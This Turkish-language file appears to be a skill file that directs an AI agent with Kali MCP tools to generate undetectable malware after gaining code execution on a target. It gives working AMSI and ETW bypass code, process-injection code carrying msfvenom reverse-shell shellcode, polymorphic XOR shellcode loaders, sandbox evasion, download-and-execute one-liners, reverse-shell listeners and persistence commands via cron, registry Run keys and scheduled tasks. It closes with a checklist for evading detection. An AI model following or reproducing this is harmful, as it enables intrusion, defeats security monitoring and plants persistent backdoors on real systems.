---
name: payload-generation
description: "Dinamik Zararlı Yazılım Üretimi. EDR ve Windows Defender atlatan (FUD), Base64 ve XOR tabanlı in-memory Python, PowerShell ve Bash payload'ları üretme, AMSI bypass, process injection, polymorphic shellcode metodolojisi."
---

# Dinamik Payload (Zararlı Yazılım) Üretim Metodolojisi

Hedef sistemde RCE elde ettin ancak standart araçlar EDR/Antivirüs tarafından engelleniyor.
Görevin: tespit edilemeyen (FUD) payload üretmek ve hedefe teslim etmek.

---

## 1. Temel Payload Üretimi

Statik analiz araçlarına takılmamak için kod şifreli/obfuscate edilmiş olmalı.

- **Eylem:** `mcp-kali-tools` → `generate_fud_payload` aracını kullan
- **Mekanizma:** Base64 + XOR ile şifreli, in-memory çalışan Python/PowerShell/Bash kodu

### Temel EDR Bypass Stratejisi

| Platform | Yöntem | Komut |
|---|---|---|
| Linux/Python | In-memory exec | `python3 -c "exec(__import__('base64').b64decode('BASE64'))"` |
| Windows/PS | EncodedCommand | `powershell -EP Bypass -NoP -W Hidden -Enc BASE64` |
| Bash | Pipe + eval | `echo "BASE64" \| base64 -d \| bash` |
| PowerShell | IEX download | `iex(New-Object Net.WebClient).DownloadString('http://IP/p.ps1')` |

---

## 2. AMSI Bypass (Windows PowerShell) — YENİ

AMSI (Antimalware Scan Interface) PowerShell script'lerini gerçek zamanlı tarar.
Aşağıdaki yöntemler bellek içi AMSI patch ile engine'i devre dışı bırakır.

### Yöntem A — Reflection ile AmsiUtils Patch

```powershell
# AMSI DLL içindeki ScanBuffer fonksiyonunu in-memory patch et
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b=$a.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null,$true)
```

### Yöntem B — Matt Graeber Bypass (Obfuscate edilmiş)

```powershell
# String obfuscation ile imza tespitini atla
$s = 'Am' + 'si' + 'Utils'
$t = [Ref].Assembly.GetType('System.Management.Automation.' + $s)
$u = $t.GetField('amsi' + 'Init' + 'Failed','NonPublic,Static')
$u.SetValue($null,$true)
```

### Yöntem C — Char Array Obfuscation

```powershell
# Her karakteri ayrı ayrı ver — string matching'i atla
$c = [char[]]@(65,109,115,105,85,116,105,108,115) -join ''
$r = [Ref].Assembly.GetType("System.Management.Automation.$c")
$f = $r.GetField('amsiInitFailed','NonPublic,Static')
$f.SetValue($null,$true)
```

### Yöntem D — COM Server AMSI Disable

```powershell
# AMSI provider COM objesini devre dışı bırak
[Runtime.InteropServices.Marshal]::WriteByte(
  [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Add-Type -Name 'WinAPI' -PassThru -MemberDefinition '[DllImport("amsi.dll")] public static extern int AmsiInitialize(string appName, out long amsiContext);').
    GetMethod('AmsiInitialize').MethodHandle.GetFunctionPointer().ToInt64() + 0x1B3, [Byte]
  ), 0x00, 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3
)
```

### Yöntem E — ETW (Event Tracing for Windows) Patch

```powershell
# ETW loglamayı da kapat (PowerShell script logging bypass)
$e = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
$f = $e.GetField('etwProvider','NonPublic,Static')
$g = $f.GetValue($null)
[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue($g, 0)
```

### AMSI Bypass Sırası

```
1. Yöntem B dene (imza DB'sinde en az)
2. Fail olursa Yöntem C (daha az tanınan)
3. Hala fail → Yöntem A + ETW patch kombinasyonu
4. Windows Defender real-time disabled ise → basit IEX yeterli
```

---

## 3. Process Injection (Windows) — YENİ

Shell doğrudan çalıştırmak yerine meşru bir process'e (explorer.exe, svchost.exe) inject et.
EDR davranışsal analizi process context'e bakar — meşru process'ten gelen aktivite düşük risk.

### Yöntem A — Classic DLL Injection

```python
import ctypes, subprocess

# Hedef process bul (örn: explorer.exe)
target_pid = int(subprocess.check_output('tasklist /FI "IMAGENAME eq explorer.exe" /FO CSV', shell=True).decode().split(',')[1].strip('"'))

shellcode = b"\xfc\xe8\x82..." # msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f raw

# Handle aç
PROCESS_ALL_ACCESS = 0x1F0FFF
handle = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, target_pid)

# Bellek ayır
addr = ctypes.windll.kernel32.VirtualAllocEx(handle, 0, len(shellcode), 0x3000, 0x40)

# Shellcode yaz
ctypes.windll.kernel32.WriteProcessMemory(handle, addr, shellcode, len(shellcode), None)

# Thread başlat
ctypes.windll.kernel32.CreateRemoteThread(handle, None, 0, addr, 0, 0, None)
```

### Yöntem B — Process Hollowing

```python
# Meşru process'i suspend başlat, belleğini kendi shellcode ile değiştir
import subprocess, ctypes
from ctypes import wintypes

STARTUPINFO = ... # suspended process için CREATE_SUSPENDED flag
# NtUnmapViewOfSection → msfvenom shellcode yaz → thread resume
```

### Yöntem C — Early Bird APC Injection

```python
# Process başlamadan önce APC queue'ya shellcode enjekte et
# CreateProcess(CREATE_SUSPENDED) → QueueUserAPC(shellcode, main_thread) → ResumeThread
# EDR hook'ları APC'yi daha az izler
```

### Yöntem D — Reflective DLL Injection (PowerShell)

```powershell
# Invoke-ReflectivePEInjection — DLL'i diske yazmadan belleğe yükle
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1')
Invoke-ReflectivePEInjection -PEBytes (Get-Content -Encoding Byte shell.dll) -ProcName explorer
```

### Process Seçim Stratejisi

| Process | Risk | Not |
|---|---|---|
| `explorer.exe` | Düşük | Her zaman çalışır, network aktivitesi normal |
| `svchost.exe` | Düşük | Servis process, EDR daha az takip eder |
| `notepad.exe` | Orta | Basit, inject kolaysa da bazen flaglenir |
| `lsass.exe` | ÇOK YÜKSEK | Her EDR izler, kullanma |

---

## 4. Polymorphic Shellcode — YENİ

Her üretimde farklı byte imzası → statik AV tespitini atla.

### Yöntem A — msfvenom + Shikata ga nai Encoder

```bash
# Her çalıştırmada farklı XOR key ile encode et
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=4444 \
  -e x64/xor_dynamic -i 5 -f raw -o shellcode.bin

# Veya Python wrapper ile dinamik key
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=4444 \
  -f py --encrypt xor --encrypt-key "$(openssl rand -hex 8)"
```

### Yöntem B — XOR Key Rotation (Python)

```python
import os, random

def polymorphic_xor_payload(shellcode: bytes) -> tuple[bytes, bytes]:
    """Her çağrıda farklı XOR key ile encode edilmiş payload döner."""
    key = bytes([random.randint(1, 254) for _ in range(16)])
    encoded = bytes(b ^ key[i % len(key)] for i, b in enumerate(shellcode))
    return encoded, key

def generate_loader(encoded: bytes, key: bytes) -> str:
    """Encoded shellcode için Python loader üret."""
    return f"""
import ctypes
key = {list(key)}
enc = {list(encoded)}
sc = bytes([enc[i] ^ key[i % len(key)] for i in range(len(enc))])
buf = (ctypes.c_char * len(sc))(*sc)
ptr = ctypes.windll.kernel32.VirtualAlloc(0, len(sc), 0x3000, 0x40)
ctypes.memmove(ptr, buf, len(sc))
ctypes.windll.kernel32.CreateThread(0, 0, ptr, 0, 0, ctypes.byref(ctypes.c_ulong(0)))
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(-1), ctypes.c_int(-1))
"""
```

### Yöntem C — Garbage Instruction Injection

```python
# NOP sled ve rastgele junk instruction'lar ekle
def add_junk_instructions(shellcode: bytes, density: float = 0.3) -> bytes:
    """Shellcode'a rastgele junk byte'lar karıştır — imzayı boz."""
    import random
    nops = [0x90, 0x40, 0x41, 0x48, 0x49]  # NOP ve benign tek-byte opcode'lar
    result = bytearray()
    for b in shellcode:
        result.append(b)
        if random.random() < density:
            result.append(random.choice(nops))
    return bytes(result)
```

### Yöntem D — Sleep-Based Sandbox Evasion

```python
import time, ctypes

def sandbox_check():
    """Sandbox ise çalışma — gerçek sistem ise devam et."""
    # Sandbox'lar sleep'i atlar, gerçek sistem atlamaz
    start = time.time()
    time.sleep(10)
    elapsed = time.time() - start
    if elapsed < 8:  # Sandbox sleep'i hızlandırdı
        return False  # Sandbox tespit edildi

    # Kullanıcı aktivitesi kontrolü
    last_input = ctypes.c_uint(0)
    ctypes.windll.user32.GetLastInputInfo(ctypes.byref(last_input))
    # Son 5 dakikada aktivite yoksa muhtemelen sandbox
    return last_input.value > 300000
```

---

## 5. Listener Kurulumu

Payload'u hedefe yollamadan önce bağlantıyı karşılayacak listener kur.

```bash
# Basit netcat
nc -lvnp 4444

# socat (daha stabil)
socat TCP-LISTEN:4444,fork EXEC:/bin/bash

# Metasploit multi/handler (en yetenekli)
msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run"
```

---

## 6. Kalıcılık (Persistence) — İsteğe Bağlı

EDR bypass edilmişse, payload'u kalıcı hale getir. Her zaman **iz bırakmama** ilkesini öncele.

| Platform | Yöntem | Komut |
|---|---|---|
| Linux | Cron job | `(crontab -l; echo "@reboot python3 -c 'PAYLOAD'") \| crontab -` |
| Windows | Registry Run | `reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v svc /t REG_SZ /d "powershell -Enc BASE64"` |
| Windows | Scheduled Task | `schtasks /create /tn "SysUpdate" /tr "powershell -Enc BASE64" /sc onlogon /ru SYSTEM` |

---

## 7. MCP Tool Referansı

```
mcp__kali-tools__generate_fud_payload(lhost, lport, platform, method)
  platform: python | powershell | bash
  method: xor | base64 | combined

mcp__kali-tools__shell_exec(cmd)
  → msfvenom, shikata_ga_nai encoder, netcat listener

mcp__kali-tools__generate_exploit_poc(vulnerability, target, context)
  → Hermes 405B ile özelleştirilmiş PoC üretimi
```

---

## 8. Tespit Önleme Kontrol Listesi

```
[ ] Disk'e doğrudan yazmadım (in-memory exec kullandım)
[ ] AMSI bypass uyguladım (Windows hedeflerde)
[ ] ETW logging kapattım (PowerShell hedeflerde)
[ ] Meşru process'e inject ettim (explorer/svchost)
[ ] Sleep-based sandbox check ekledim
[ ] XOR key her üretimde farklı (polymorphic)
[ ] Listener hazır ve çalışıyor
[ ] Rate limit: tek bağlantı, çok connect deneme yok
```
